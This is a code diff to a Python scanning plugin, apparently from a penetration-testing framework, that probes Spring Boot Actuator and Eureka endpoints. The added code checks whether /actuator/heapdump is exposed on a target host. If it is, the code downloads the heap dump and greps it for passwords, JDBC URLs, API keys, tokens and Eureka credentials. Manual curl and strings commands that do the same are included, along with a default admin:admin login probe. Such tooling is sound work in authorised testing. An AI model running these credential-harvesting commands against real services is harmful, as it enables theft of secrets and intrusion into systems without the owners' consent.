@@ -26,8 +26,11 @@ class SpringBootActuator(ServiceScan):
 		self.add_list_option('common-paths', default=[
 			'/', '/actuator', '/actuator/health', '/actuator/info', '/actuator/env',
 			'/actuator/beans', '/actuator/configprops', '/actuator/mappings', '/actuator/metrics',
+			'/actuator/heapdump', '/actuator/threaddump', '/actuator/trace', '/actuator/dump',
+			'/actuator/features', '/actuator/loggers', '/actuator/shutdown', '/actuator/refresh',
 			'/manage', '/management', '/admin', '/health', '/info', '/status',
-			'/eureka', '/eureka/apps', '/eureka/status', '/v2/apps'
+			'/eureka', '/eureka/apps', '/eureka/status', '/v2/apps', '/eureka/apps/delta',
+			'/error', '/trace', '/dump', '/autoconfig', '/beans', '/configprops'
 		], help='Common Spring Boot and Eureka management endpoints to check. Default: %(default)s')
 		
 		# Match unknown services on common Spring Boot ports
@@ -220,9 +223,51 @@ class SpringBootActuator(ServiceScan):
 				else:
 					service.info("⚠️ Some endpoints may have failed")
 				
+				# Check for heapdump availability and extract credentials
+				service.info(f"🧠 Checking for heapdump availability and credential extraction...")
+				timeout = self.get_option("timeout")
+				heapdump_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_heapdump_{hostname_label}.txt'
+				
+				# Check if heapdump is accessible
+				process, stdout, _ = await service.execute(
+					f'echo "=== Testing /actuator/heapdump endpoint ===" && '
+					f'curl -s -I -m {timeout} {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump 2>&1',
+					outfile=None
+				)
+				
+				heapdump_available = False
+				if process.returncode == 0 and stdout:
+					try:
+						output_lines = await stdout.readlines()
+						output_content = '\n'.join(output_lines) if output_lines else ''
+						if '200 ok' in output_content.lower():
+							heapdump_available = True
+							service.info("🚨 CRITICAL: Heapdump endpoint is accessible!")
+					except Exception as e:
+						service.info(f"⚠️ Error checking heapdump: {e}")
+				
+				if heapdump_available:
+					# Download heapdump and search for credentials
+					service.info(f"📥 Downloading heapdump for credential extraction...")
+					await service.execute(
+						f'echo "=== Downloading heapdump ===" && '
+						f'curl -s -m {timeout*6} {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump '
+						f'-o {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof && '
+						f'echo "=== Searching for passwords ===" && '
+						f'if [ -f {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof ]; then '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -i "password=" | head -20; '
+						f'  echo "=== Searching for database URLs ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -i "jdbc:" | head -10; '
+						f'  echo "=== Searching for API keys ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -iE "(api.?key|secret|token)" | head -15; '
+						f'  echo "=== Searching for Eureka credentials ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -iE "eureka.*@|@.*eureka" | head -10; '
+						f'fi',
+						outfile=heapdump_outfile
+					)
+				
 				# Check for common Spring Boot error pages and info disclosure
 				service.info(f"🚨 Checking for information disclosure...")
-				timeout = self.get_option("timeout")
 				error_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_error_{hostname_label}.txt'
 				await service.execute(
 					f'echo "=== Testing /error endpoint ===" && '
@@ -283,11 +328,18 @@ class SpringBootActuator(ServiceScan):
 				f'curl -s -I {{http_scheme}}://{hostname}:{{port}}/',
 				f'',
 				f'# Check actuator endpoints',
-				f'for endpoint in /actuator /actuator/health /actuator/info /actuator/env /actuator/beans; do',
+				f'for endpoint in /actuator /actuator/health /actuator/info /actuator/env /actuator/beans /actuator/heapdump; do',
 				f'  echo "=== $endpoint ===";',
 				f'  curl -s {{http_scheme}}://{hostname}:{{port}}$endpoint;',
 				f'  echo "";',
 				f'done',
+				f'',
+				f'# CRITICAL: Download and analyze heapdump for credentials',
+				f'curl -s {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump -o heapdump_{{port}}.hprof',
+				f'strings heapdump_{{port}}.hprof | grep -i "password=" | head -20',
+				f'strings heapdump_{{port}}.hprof | grep -i "jdbc:" | head -10',
+				f'strings heapdump_{{port}}.hprof | grep -iE "eureka.*@|@.*eureka" | head -10',
+				f'strings heapdump_{{port}}.hprof | grep -iE "(api.?key|secret|token)" | head -15',
 				f'',
 				f'# Test common credentials',
 				f'curl -s -u admin:admin {{http_scheme}}://{hostname}:{{port}}/',
@@ -295,5 +347,9 @@ class SpringBootActuator(ServiceScan):
 				f'',
 				f'# Check for management interfaces',
 				f'curl -s {{http_scheme}}://{hostname}:{{port}}/manage',
-				f'curl -s {{http_scheme}}://{hostname}:{{port}}/admin'
+				f'curl -s {{http_scheme}}://{hostname}:{{port}}/admin',
+				f'',
+				f'# Check Eureka apps and services',
+				f'curl -s {{http_scheme}}://{hostname}:{{port}}/eureka/apps',
+				f'curl -s {{http_scheme}}://{hostname}:{{port}}/v2/apps'
 			])
